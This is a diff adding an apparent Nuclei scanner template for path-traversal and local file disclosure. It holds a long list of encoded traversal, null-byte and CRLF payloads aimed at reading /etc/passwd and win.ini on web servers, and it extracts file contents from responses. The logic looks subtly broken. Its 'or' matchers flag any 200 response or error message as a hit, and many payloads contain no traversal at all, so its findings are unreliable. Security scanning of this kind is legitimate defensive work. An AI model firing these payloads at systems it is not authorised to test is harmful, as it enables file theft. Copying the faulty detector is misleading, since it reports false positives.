@@ -1,0 +1,215 @@
+id: path-traversal-detection
+info:
+  name: Path Traversal Detection
+  author: pwn
+  severity: high
+  description: Detects Path Traversal vulnerabilities by injecting payloads that attempt to access sensitive files using directory traversal sequences, encoded variations, and special characters to bypass sanitization.
+  tags: path-traversal, file-disclosure, lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file={{payload}}"
+      - "{{BaseURL}}/path={{payload}}"
+      - "{{BaseURL}}/download={{payload}}"
+      - "{{BaseURL}}:8080/file={{payload}}"
+      - "{{BaseURL}}:8080/path={{payload}}"
+      - "{{BaseURL}}:8080/download={{payload}}"
+    payloads:
+      payload:
+        - "."
+        - ".."
+        - "%2e"
+        - "%252e"
+        - "%u002e"
+        - "%c0%2e"
+        - "%e0%40%ae"
+        - "%c0ae"
+        - "%E3%80%82"
+        - "%E2%80%A5"
+        - "/"
+        - ";/"
+        - "//"
+        - "\\/"
+        - "/./"
+        - "%2f"
+        - "%252f"
+        - "%u2215"
+        - "%c0%af"
+        - "%e0%80%af"
+        - "%c0%2f"
+        - "%E2%88%95"
+        - "\\"
+        - ";\\"
+        - "\\\\"
+        - "\\."
+        - "%255c"
+        - "%u2216"
+        - "%c0%5c"
+        - "%c0%80%5c"
+        - "%E2%88%96"
+        - "etc/passwd"
+        - "etc%2fpasswd"
+        - "etc%252fpasswd"
+        - "etc\\passwd"
+        - "etc%5cpasswd"
+        - "etc%255cpasswd"
+        - "etc//passwd"
+        - "etc/%2fpasswd"
+        - "etc%2f%2fpasswd"
+        - "etc/x/../y/../passwd"
+        - "etc/x/..%2fy/..%2fpasswd"
+        - "etc/x/%2e%2e/y/%2e%2e/passwd"
+        - "etc/x/%2e%2e%2fy/%2e%2e%2fpasswd"
+        - "etc/passwd%00.css"
+        - "etc%2fpasswd%00.css"
+        - "etc/passwd?"
+        - "etc/passwd%3F"
+        - "etc%E2%88%95passwd"
+        - "etc%E2%88%96passwd"
+        - "windows/win.ini"
+        - "windows%2fwin.ini"
+        - "Windows//win.ini"
+        - "Windows\\win.ini"
+        - "windows%5cwin.ini"
+        - "Windows\\\\win.ini"
+        - "C:\\windows\\win.ini"
+        - "c%3a%5cwindows%5cwin.ini"
+        - "Windows/x/../win.ini"
+        - "Windows/x/%2e%2e/win.ini"
+        - "Windows/x/..%2fwin.ini"
+        - "Windows\\x\\..\\win.ini"
+        - "Windows\\x\\%2e%2e\\win.ini"
+        - "Windows\\x\\..%5cwin.ini"
+        - "Windows/win.ini%00.css"
+        - "windows%E2%88%95win.ini"
+        - "windows%E2%88%96win.ini"
+        - "#"
+        - "%23"
+        - "%2523"
+        - "%u0023"
+        - "?"
+        - "%3f"
+        - "%253f"
+        - "%u003f"
+        - "&"
+        - "%26"
+        - "%2526"
+        - "%u0026"
+        - "@"
+        - "%40"
+        - "%2540"
+        - "%u0040"
+        - "%20"
+        - "%2520"
+        - "%u0020"
+        - "%00"
+        - "%u0000"
+        - "%0d"
+        - "%u000d"
+        - "%E5%98%8D"
+        - "%0a"
+        - "%000a"
+        - "%E5%98%8A"
+        - "%0d%0a"
+        - "%u000d%u000a"
+        - "%E5%98%8D%E5%98%8A"
+        - "file"
+        - "file?"
+        - "file%3F"
+        - "file%253F"
+        - "file#"
+        - "file%23"
+        - "file%2523"
+        - "file.EXT"
+        - "file.eXt"
+        - "file?.EXT"
+        - "file%3F.EXT"
+        - "file%253F.EXT"
+        - "file.EXT;.EXT"
+        - "file.EXT%3B.EXT"
+        - "file.EXT%25%3B.EXT"
+        - "file#.EXT"
+        - "file%23.EXT"
+        - "file%2523.EXT"
+        - "file.EXT.EXT"
+        - "file.EXT?.EXT"
+        - "file.EXT%3F.EXT"
+        - "file.EXT%253F.EXT"
+        - "file.EXT#.EXT"
+        - "file.EXT%23.EXT"
+        - "file.EXT%2523.EXT"
+        - "file.EXT%00.EXT"
+        - "..;/"
+        - "..;%2f"
+        - "..;%252f"
+        - "%2e%2e%3b%2f"
+        - "%252e%252e%253b%252f"
+        - "%u002e%u002e%u003b%u2215"
+        - "..\\"
+        - "..%5c"
+        - "..%255c"
+        - "%2e%2e%5c"
+        - "%252e%252e%255c"
+        - "%u002e%u002e%u2216"
+        - "%E3%80%82%E3%80%82%E2%88%96"
+        - ".;\\"
+        - "..;%5c"
+        - "..;%255c"
+        - "%2e%2e%3b%5c"
+        - "%252e%252e%253b%255c"
+        - "%u002e%u002e%u003b%u2216"
+        - "../"
+        - "..%2f"
+        - "..%252f"
+        - "%2e%2e%2f"
+        - "%252e%252e%252f"
+        - "%u002e%u002e%u2215"
+        - "%E3%80%82%E3%80%82%E2%88%95"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:[0-9]+:[0-9]+:.*:/.*:/.*"
+          - "\\[extensions\\]"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "No such file"
+          - "Permission denied"
+          - "File not found"
+          - "Access denied"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Content-Type: text/plain"
+          - "Content-Type: application/octet-stream"
+        part: header
+        condition: or
+        case-insensitive: true
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
+      - type: regex
+        name: file_content
+        part: body
+        regex:
+          - "root:[x*]:[0-9]+:[0-9]+:.*:/.*:/.*"
+          - "\\[extensions\\]"
+        group: 0
+      - type: regex
+        name: response_data
+        part: body
+        regex:
+          - "(No such file|Permission denied|File not found|Access denied)[^&\\s\"']+"
+        group: 1
